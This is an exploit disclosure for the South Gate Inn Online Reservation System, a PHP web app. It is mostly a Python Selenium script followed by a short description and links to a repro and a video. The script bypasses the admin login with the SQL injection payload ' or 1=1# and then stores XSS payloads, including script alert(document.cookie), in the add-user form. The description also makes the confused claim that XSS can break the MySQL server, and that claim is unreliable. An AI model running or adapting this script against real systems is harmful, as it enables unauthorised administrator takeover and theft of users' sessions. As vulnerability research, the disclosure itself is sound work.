### Exploit Title: South Gate Inn Online Reservation System © South Gate Inn is vulnerable from remote SQL-Injection-Bypass-Authentication and XSS-Stored PWNED.
### Author: nu11secur1ty
### Testing and Debugging: nu11secur1ty 
### Date: 09.16.2021
### Vendor: https://www.sourcecodester.com/user/51695/activity
### Link: https://www.sourcecodester.com/php/10584/south-gate-inn-online-reservation-system.html
### CVE: CVE-nu11-12

[+] Exploit Source: 

#!/usr/bin/python3
# Author: @nu11secur1ty
# Debug and Developement: @nu11secur1ty 
# CVE-nu11-12

from selenium import webdriver
import time
import os
from colorama import init, Fore, Back, Style
from selenium.webdriver.chrome.options import Options
init(convert=True)


#enter the link to the website you want to automate login.
### 0
website_link0="http://192.168.1.180/southgateinn/SouthGateInn/admin/login.php"

#enter your login username
username0="nu11secur1ty' or 1=1#"

#enter your login password
password0="nu11secur1ty' or 1=1#"

#enter the element for username input field
element_for_username0="email"
#enter the element for password input field
element_for_password0="pass"

browser = webdriver.Chrome()
browser.get((website_link0))	


try:
	### 0
	username_element = browser.find_element_by_name(element_for_username0)
	username_element.send_keys(username0)		
	password_element  = browser.find_element_by_name(element_for_password0)
	password_element.send_keys(password0)
	browser.maximize_window()
	time.sleep(1)
	browser.execute_script("document.querySelector('[name=\"btnlogin\"]').click()")
	
	# Alert
	vuln1="http://192.168.1.180/southgateinn/SouthGateInn/admin/mod_users/index.php?view=add"
	browser.get((vuln1))
	
	browser.execute_script("document.querySelector('[name=\"UNAME\"]').value=\"</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /><span>\"")
	browser.execute_script("document.querySelector('[name=\"USERNAME\"]').value=\"</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /><span>\"")
	browser.execute_script("document.querySelector('[name=\"UPASS\"]').value=\"</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /><span>\"")
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-primary\"]').click()")
	
	time.sleep(15)
	# cookie
	vuln="http://192.168.1.180/southgateinn/SouthGateInn/admin/mod_users/index.php?view=add"
	browser.get((vuln))
	
	browser.execute_script("document.querySelector('[name=\"UNAME\"]').value=\"<script>alert(document.cookie)</script>\"")
	browser.execute_script("document.querySelector('[name=\"USERNAME\"]').value=\"<script>alert(document.cookie)</script>\"")
	browser.execute_script("document.querySelector('[name=\"UPASS\"]').value=\"<script>alert(document.cookie)</script>\"")
	time.sleep(1)
	browser.execute_script("document.querySelector('[class=\"btn btn-primary\"]').click()")
	
	
	print(Fore.RED + 'The payload for CVE-nu11-12 is deployed and your admin account is PWNED by SQL - Injection\n')
	print(Fore.YELLOW + 'And XSS-Stored PWNED\n')
	print(Style.RESET_ALL)
	
except Exception:
	#### This exception occurs if the element are not found in the webpage.
	print("Some error occured :(")


------------------------------------------------------------------

### Description:
The South Gate Inn Online Reservation System © South Gate Inn is vulnerable from remote SQL-Injection-Bypass-Authentication for the admin account and XSS-Stored PWNED.
remote SQL-Injection-Bypass-Authentication: https://portswigger.net/support/using-sql-injection-to-bypass-authentication. 
The parameters (email and Password) from the login form is not protected correctly and there is no security and escaping from malicious payloads. 
When the user will sending a malicious query or malicious payload to the MySQL server for login to the admin account on the system, 
he can bypass the login credentials and take control of this account. 
And the second time he can access the admin account and adding an payload by using XSS-Stored technique which can break the MySQL server.

### BR 
- [+] @nu11secur1ty System Administrator - Infrastructure and Penetration Testing Engineer

-------------------------------------------------------------------
### Reproduce: https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/janobe/CVE-nu11-12-09162021
### Proof: https://streamable.com/a2ym1t
### BR nu11secur1ty
